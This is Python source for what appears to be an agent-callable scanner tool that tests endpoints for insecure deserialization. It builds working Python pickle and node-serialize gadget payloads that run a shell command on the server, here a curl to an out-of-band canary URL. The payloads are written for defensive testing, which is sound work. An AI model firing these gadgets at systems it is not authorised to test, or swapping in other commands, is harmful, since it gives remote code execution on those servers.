"""Insecure-deserialization testing, proven out of band.

If an endpoint deserializes attacker-controlled data (a pickled Python object, a
node-serialize blob, a Java/PHP object), a crafted payload runs code on the
server. This sends language-specific gadget payloads whose only action is to call
a unique canary URL; a callback proves remote code execution via deserialization.
Benign by design — the gadget just makes an HTTP request to your listener.
"""
from __future__ import annotations

import base64

from proofmark.http_client import Request
from proofmark.tools.base import Tool, ToolResult


def _python_pickle(cmd: str) -> str:
    """Base64 pickle whose __reduce__ runs `cmd` on unpickle. Built here, never run."""
    import os
    import pickle

    class _Gadget:
        def __reduce__(self):
            return (os.system, (cmd,))

    return base64.b64encode(pickle.dumps(_Gadget())).decode()


def _node_serialize(cmd: str) -> str:
    # node-serialize immediately-invoked function expression
    safe = cmd.replace("'", "\\'")
    return ('{"pm":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\''
            + safe + "')}()\"}")


class DeserializationTool(Tool):
    name = "deserialization_test"
    description = (
        "Test an endpoint for insecure deserialization (RCE). Sends benign gadget payloads "
        "(Python pickle, node-serialize) whose only effect is to call an out-of-band canary; a "
        "callback proves the server deserialized attacker data and ran code. Needs the OOB listener. "
        "Give the url; where the blob is read (body / param / cookie) and the field name if a param."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Endpoint that deserializes input."},
            "method": {"type": "string", "description": "HTTP method (default POST)."},
            "where": {"type": "string", "enum": ["body", "param", "cookie"],
                      "description": "Where the serialized blob is read (default body)."},
            "param": {"type": "string", "description": "Field/cookie name, when where=param or cookie."},
        },
        "required": ["url"],
    }
    returns_untrusted_data = True

    def __init__(self, client, oob=None) -> None:
        self._client = client
        self._oob = oob

    def _send(self, method, url, blob, where, param):
        headers, body = {}, None
        if where == "cookie":
            headers["Cookie"] = f"{param or 'session'}={blob}"
        elif where == "param":
            from urllib.parse import urlencode
            body = urlencode({param or "data": blob})
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            body = blob
            headers["Content-Type"] = "application/octet-stream"
        self._client.send(Request(method, url, headers, body))

    def run(self, url="", method="POST", where="body", param="", **_) -> ToolResult:
        if self._oob is None:
            return ToolResult("Deserialization proof needs the out-of-band listener, which is not "
                              "available in this run. Enable OOB and retry.", is_error=True)
        method = (method or "POST").upper()
        where = where if where in ("body", "param", "cookie") else "body"
        token = self._oob.new_canary(f"deser {url}")
        canary = self._oob.http_url(token)
        cmd = f"curl {canary}"
        for blob in (_python_pickle(cmd), _node_serialize(cmd)):
            self._send(method, url, blob, where, param)
        if self._oob.interactions(token):
            return ToolResult(
                f"INSECURE DESERIALIZATION CONFIRMED on {url} (critical). A gadget payload was "
                f"deserialized and ran code — the canary was hit: "
                f"{self._oob.interactions(token)[0].summary()}. This is remote code execution; "
                "record it and replay once to corroborate.")
        return ToolResult(
            f"No deserialization RCE confirmed on {url}. Neither the pickle nor node-serialize "
            "gadget reached the canary — the endpoint may not deserialize this input, or uses a "
            "safe format. Try other locations (a different cookie/param) if suspicious.")
